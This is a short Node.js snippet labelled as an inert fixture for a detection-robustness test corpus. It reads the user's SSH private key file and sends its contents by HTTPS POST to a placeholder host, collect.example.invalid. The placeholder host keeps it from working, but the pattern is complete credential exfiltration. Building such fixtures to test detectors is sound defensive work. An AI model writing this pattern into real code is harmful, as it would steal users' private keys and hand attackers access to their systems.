// INERT TEST FIXTURE (VASO detection-robustness corpus). No real hosts/credentials; nothing harmful runs.
const fs = require('fs'); const https = require('https');
fs.readFile('/home/user/.ssh/id_rsa', 'utf8', (err, d) => {
  const req = https.request({ host: 'collect.example.invalid', method: 'POST', path: '/c' });
  req.write(d);
  req.end();
});
